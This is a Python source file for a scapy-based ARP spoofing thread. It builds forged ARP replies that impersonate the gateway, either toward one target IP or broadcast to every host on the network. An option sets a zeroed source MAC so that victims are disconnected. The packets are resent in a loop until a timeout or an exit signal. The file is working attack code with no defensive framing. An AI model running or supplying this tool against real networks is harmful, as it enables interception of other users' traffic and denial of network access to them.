import threading
from scapy.all import ARP, Ether, send, sendp
import time

from src.log import log

class ARP_Spoofer(threading.Thread):
    #Thread that sends an ARP packet to a target simulating to be the gateway.
    
    def __init__(self, exit_event, target, gateway, timeout, interval, disconnect):
        super().__init__()
        self.exit_event = exit_event
        self.target = target
        self.gateway = gateway
        self.interval = interval
        self.timeout = timeout
        self.disconnect = disconnect
    
    def make_packet(self):
        #single objective: ARP(pdst=self.target, psrc=self.gateway)
        #single objective dc: ARP(pdst=self.target, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
        #all: Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway)
        #all dc: Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
        
        # ~ #if self.disconnect, hwsrc is error mac. if not, it is default mac.
        # ~ p_hwsrc = None if not self.disconnect else "00:00:00:00:00:00"
        
        # ~ #if target is "all", pdst should be None
        # ~ p_pdst = self.target if self.target != "all" else None
        
        
        # ~ p = ARP(pdst = p_pdst, psrc = self.gateway, hwsrc = p_hwsrc)
        # ~ if self.target == "all": p = Ether(dst="ff:f
        
        if self.target == "everyone":
            log.arps.warning("target_everyone")
            if self.disconnect: p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
            else:               p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway)
        else:
            if self.disconnect: p = ARP(pdst=self.target, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
            else:               p = ARP(pdst=self.target, psrc=self.gateway)
        
        return p
    
    
    def run(self):
        log.arps.info("start", target=self.target, interval=self.interval, timeout=self.timeout, disconnect=str(self.disconnect))
    
        a = self.make_packet()
        
        if a.haslayer("Ether"): my_send = sendp
        else:                   my_send = send
            
        
        if self.timeout:
            resting_timeout = self.timeout
            while resting_timeout > 0 and not self.exit_event.is_set():
                my_send(a, inter=self.interval, count=1, verbose=0)
                resting_timeout -= self.interval
        else:
            while not self.exit_event.is_set():
                my_send(a, inter=self.interval, count=1, verbose=0)

        
        log.arps.info("finish", target=self.target, gateway=self.gateway, disconnect=self.disconnect)
            

    
